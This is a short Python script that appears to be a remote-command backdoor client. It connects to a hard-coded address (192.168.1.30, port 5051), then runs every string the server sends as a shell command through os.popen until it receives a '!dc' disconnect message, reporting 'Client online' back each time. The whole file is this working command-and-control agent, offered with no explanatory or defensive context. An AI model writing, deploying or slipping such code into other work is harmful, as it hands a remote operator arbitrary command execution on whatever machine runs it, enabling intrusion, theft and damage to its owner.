import socket
from os import popen

s = socket.socket()
HOST = "192.168.1.30"
PORT = 5051
SERVER = (HOST, PORT)
FORMAT = "utf-8"
BUFFER = 1024
DC_MSG = "!dc"
s.connect(SERVER)

run = True
while run:
    cmd = s.recv(BUFFER).decode(FORMAT)
    if cmd == DC_MSG:
        run = False
    else:
        popen(cmd)

    s.send("Client online ....".encode(FORMAT))

